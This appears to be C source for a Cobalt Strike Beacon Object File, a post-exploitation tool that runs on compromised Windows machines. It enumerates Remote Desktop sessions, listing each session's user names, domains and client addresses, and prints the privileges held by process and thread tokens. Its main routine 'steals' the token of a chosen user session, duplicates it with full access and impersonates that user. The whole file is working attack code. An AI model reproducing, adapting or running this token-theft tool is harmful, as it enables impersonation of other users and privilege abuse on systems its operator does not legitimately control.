#include <windows.h>
#include <wtsapi32.h>
#include <processthreadsapi.h>
#include "beacon.h"
#include "bofdefs.h"

void print_username(HANDLE token) {
    PTOKEN_USER user;
    DWORD out;
    char *username;
    char *domain;
    ADVAPI32$GetTokenInformation(token, TokenUser, NULL, 0, &out);
    user = (PTOKEN_USER)intAlloc(out);
    if (ADVAPI32$GetTokenInformation(token, TokenUser, user, out, &out)) {
        DWORD uSize = 4096;
        DWORD dSize = 4096;
        username = intAlloc(uSize);
            domain = intAlloc(dSize);
        SID_NAME_USE sidType;
        ADVAPI32$LookupAccountSidA(NULL, user->User.Sid, username, &uSize, domain, &dSize, &sidType);
                int err = (int)KERNEL32$GetLastError();
        if (err == 0 || err == 122) {
                BeaconPrintf(0, "\ttoken %x: %s\\%s\n", token, domain, username);
        } else {
                        BeaconPrintf(0, "\tuser lookup err %d, sizes: u%d, d%d\n", err, uSize, dSize);
        }
        intFree(username);
            intFree(domain);

            PTOKEN_PRIVILEGES tokenPrivileges;
            DWORD returnLength;
            ADVAPI32$GetTokenInformation(token, TokenPrivileges, NULL, 0, &returnLength);
            tokenPrivileges = (PTOKEN_PRIVILEGES)intAlloc(returnLength);
            ADVAPI32$GetTokenInformation(token, TokenPrivileges, tokenPrivileges, returnLength, &returnLength);
            for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; i++) {
                char privilegeName[256];
                DWORD nameLength = 256;
                if (ADVAPI32$LookupPrivilegeNameA(NULL, &(tokenPrivileges->Privileges[i].Luid), privilegeName, &nameLength)) {
                    BeaconPrintf(0, "\tpriv: %s\n", privilegeName);
                }
        }
        intFree(tokenPrivileges);
    }
    
    intFree(user);
    return;
}
const CHAR* WTSSessionStateToString(WTS_CONNECTSTATE_CLASS state)
{
        switch (state)
        {
                case WTSActive:
                        return "WTSActive";
                case WTSConnected:
                        return "WTSConnected";
                case WTSConnectQuery:
                        return "WTSConnectQuery";
                case WTSShadow:
                        return "WTSShadow";
                case WTSDisconnected:
                        return "WTSDisconnected";
                case WTSIdle:
                        return "WTSIdle";
                case WTSListen:
                        return "WTSListen";
                case WTSReset:
                        return "WTSReset";
                case WTSDown:
                        return "WTSDown";
                case WTSInit:
                        return "WTSInit";
        }
        return "INVALID_STATE";
}

DWORD enum_sessions() {
            HANDLE hServer = WTS_CURRENT_SERVER_HANDLE;
            DWORD count;
            PWTS_SESSION_INFOA pSessionInfo;
    
            int bSuccess = WTSAPI32$WTSEnumerateSessionsA(hServer, 0, 1, &pSessionInfo, &count);

            if (!bSuccess)
            {
                BeaconPrintf(0, "WTSEnumerateSessions failed: %d\n", (int)KERNEL32$GetLastError());
                return 0;
            }

            BeaconPrintf(0, "WTSEnumerateSessions count: %d\n", (int)count);

            for (int index = 0; index < count; index++) {
                char* Username;
                char* Domain;
                WTS_CONNECTSTATE_CLASS ConnectState;
                PWTS_CLIENT_DISPLAY ClientDisplay;
                PWTS_CLIENT_ADDRESS ClientAddress;
                DWORD sessionId;

                LPSTR pBuffer = NULL;
                DWORD bytesReturned = 0;

                sessionId = pSessionInfo[index].SessionId;

                BeaconPrintf(0, "[%u] SessionId: %u State: %s (%u) WinstationName: '%s'\n",
                    index,
                    pSessionInfo[index].SessionId,
                    WTSSessionStateToString(pSessionInfo[index].State),
                    pSessionInfo[index].State,
                    pSessionInfo[index].pWinStationName);

                if (!WTSAPI32$WTSQuerySessionInformationA(hServer, sessionId, WTSUserName, &pBuffer, &bytesReturned))
                    return -1;


                Username = (char*)pBuffer;
                BeaconPrintf(0, "\tWTSUserName:  %s\n", Username);

                if (!WTSAPI32$WTSQuerySessionInformationA(hServer, sessionId, WTSDomainName, &pBuffer, &bytesReturned))
                    return -1;


                Domain = (char*)pBuffer;
                BeaconPrintf(0, "\tWTSDomainName: %s\n", Domain);

                if (!WTSAPI32$WTSQuerySessionInformationA(hServer, sessionId, WTSConnectState, &pBuffer, &bytesReturned))
                    return -1;

                ConnectState = *((WTS_CONNECTSTATE_CLASS*)pBuffer);
                BeaconPrintf(0, "\tWTSConnectState: %u (%s)\n", ConnectState, WTSSessionStateToString(ConnectState));


                if (!WTSAPI32$WTSQuerySessionInformationA(hServer, sessionId, WTSClientAddress, &pBuffer, &bytesReturned))
                    return -1;


                ClientAddress = (WTS_CLIENT_ADDRESS*)pBuffer;

                if (AF_INET == ClientAddress->AddressFamily)
                {
                    BeaconPrintf(0, "\tClient Address : %d.%d.%d.%d\n",
                        ClientAddress->Address[2], ClientAddress->Address[3], ClientAddress->Address[4], ClientAddress->Address[5]);
                }

        }
}




VOID go( 
        IN PCHAR Buffer, 
        IN ULONG Length 
) 
{

    //CALLYOURFUNCHERE
    BeaconPrintf(0, "[?] current process token:\n");
    print_username((HANDLE)~(ULONG_PTR)3); // current token handle
    BeaconPrintf(0, "[?] current thread token:\n");
    print_username((HANDLE)~(ULONG_PTR)4); // current token handle
    datap parser = {0};
    BeaconDataParse(&parser, Buffer, Length);
    int SessionId = BeaconDataInt(&parser);
    if (SessionId == -1) {
            enum_sessions();
            return;
    }

    HANDLE hToken = 0;
    HANDLE duplicated_token = 0;
    BeaconPrintf(0, "[+] stealing token\n");
    WTSAPI32$WTSQueryUserToken(SessionId, &hToken);
    if (!hToken) {
        BeaconPrintf(0, "[-] no token\n");
        return;
    }

    BeaconPrintf(0, "[+] stole token from sessionId: %d, HANDLE is 0x%x \n", SessionId, hToken);
    ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicated_token);
    print_username(duplicated_token); // current token handle
    int err = (int)KERNEL32$GetLastError();
    if (err != 0) {
            BeaconPrintf(0, "[-] duplicate err %d\n", err);
        return;
    }

    ADVAPI32$ImpersonateLoggedOnUser(duplicated_token);
    err = (int)KERNEL32$GetLastError();
    if (err != 0) {
            BeaconPrintf(0, "[-] impersonate err %d\n", err);
        return;
    }
    BeaconPrintf(0, "[?] current thread token (after impersonation):\n", SessionId, hToken);
    print_username((HANDLE)~(ULONG_PTR)4); // current token handle
    
    KERNEL32$CloseHandle(hToken);

};

